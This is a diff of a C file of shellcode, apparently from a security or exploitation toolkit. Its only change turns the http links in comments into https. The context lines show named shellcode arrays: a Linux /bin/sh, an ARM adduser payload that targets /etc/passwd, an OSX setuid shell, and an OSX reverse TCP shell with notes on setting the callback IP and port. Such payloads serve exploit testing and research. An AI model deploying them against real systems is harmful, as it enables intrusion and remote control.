@@ -26,7 +26,7 @@
 #define ut8 unsigned char
 
 // moar at:
-// http://www.groar.org/expl/openbsd/english.shtml
+// https://www.groar.org/expl/openbsd/english.shtml
 
 #if SELFSTOP
 
@@ -229,7 +229,7 @@ char sparc_linux_binsh[]=
 
 /* javicoder shellcodes
   --------------------- beerware license
-  http://www.48bits.com/papers/sparc_shellcodes.txt
+  https://www.48bits.com/papers/sparc_shellcodes.txt
 */
 char sparc_linux_javicoder_binsh[] =
 	"\x21\x0b\xd8\x9a\xa0\x14\x21\x6e\x23\x0b"
@@ -804,7 +804,7 @@ char x86_ppc_osx_binsh[] =
 	"\x58"; // X
 
 /* by Jonathan Salwan
- * http://shell-storm.org/shellcode/files/shellcode-735.php
+ * https://shell-storm.org/shellcode/files/shellcode-735.php
  */
 char arm_linux_adduser[] =
 	/* Thumb mode */
@@ -864,7 +864,7 @@ char arm_linux_adduser[] =
 	"\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64";
 
 /* by Dustin Schultz
- * http://shell-storm.org/shellcode/files/shellcode-736.php
+ * https://shell-storm.org/shellcode/files/shellcode-736.php
  */
 char x64_osx_suidsh[] =
 	"\x41\xb0\x02\x49\xc1\xe0\x18\x49\x83\xc8\x17\x31\xff\x4c\x89\xc0"
@@ -875,7 +875,7 @@ char x64_osx_suidsh[] =
 /* OSX reverse tcp shell (131 bytes)
  * replace FFFFFFFF around byte 43 with the call back ip in hex
  * replace 5C11 around byte 39 with a new port current is 4444
- * http://hammackj.com/2011/04/28/osx-x64-reverse-tcp-shellcode/
+ * https://hammackj.com/2011/04/28/osx-x64-reverse-tcp-shellcode/
  */
 char x64_osx_reverse_tcp[] =
 	"\x41\xb0\x02\x49\xc1\xe0\x18\x49\x83\xc8\x61\x4c\x89\xc0\x48"
